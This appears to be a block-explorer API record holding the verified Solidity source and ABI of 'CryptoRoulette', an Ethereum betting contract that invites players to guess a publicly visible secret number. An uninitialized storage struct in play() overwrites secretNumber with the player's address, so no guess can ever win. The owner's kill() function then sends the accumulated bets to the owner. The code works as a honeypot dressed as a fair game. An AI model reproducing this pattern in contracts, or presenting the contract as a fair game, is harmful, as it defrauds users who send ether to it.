{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.24;\r\n\r\n// To play, call the play() method with the guessed number.  Bet price: 0.1 ether\r\n\r\ncontract CryptoRoulette {\r\n\r\n    uint256 public secretNumber;\r\n    uint256 public lastPlayed;\r\n    uint256 public betPrice = 0.1 ether;\r\n    address public ownerAddr;\r\n\r\n    struct Game {\r\n        address player;\r\n        uint256 number;\r\n    }\r\n    Game[] public gamesPlayed;\r\n\r\n    function CryptoRoulette() public {\r\n        ownerAddr = msg.sender;\r\n        generateNewRandom();\r\n    }\r\n\r\n    function generateNewRandom() internal {\r\n        // initialize secretNumber with a value between 0 and 15\r\n        secretNumber = uint8(sha3(now, block.blockhash(block.number-1))) % 16;\r\n    }\r\n\r\n    function play(uint256 number) payable public {\r\n        require(msg.value >= betPrice && number < 16);\r\n\r\n        Game game;\r\n        game.player = msg.sender;\r\n        game.number = number;\r\n        gamesPlayed.push(game);\r\n\r\n        if (number == secretNumber) {\r\n            // win!\r\n            if(msg.value*15>this.balance){\r\n                msg.sender.transfer(this.balance);\r\n            }\r\n            else{\r\n                msg.sender.transfer(msg.value*15);\r\n            }\r\n        }\r\n\r\n        generateNewRandom();\r\n        lastPlayed = now;\r\n    }\r\n\r\n    function kill() public {\r\n        if (msg.sender == ownerAddr && now > lastPlayed + 1 days) {\r\n            suicide(msg.sender);\r\n        }\r\n    }\r\n\r\n    function() public payable { }\r\n}","ABI":"[{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"gamesPlayed\",\"outputs\":[{\"name\":\"player\",\"type\":\"address\"},{\"name\":\"number\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"kill\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"number\",\"type\":\"uint256\"}],\"name\":\"play\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"ownerAddr\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"secretNumber\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"lastPlayed\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"betPrice\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"CryptoRoulette","CompilerVersion":"v0.4.24+commit.e67f0147","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://6af8cb654928c1aabd7d0eb89e942d366836af59f7fd28fe8d42525e1488d3cd"}]}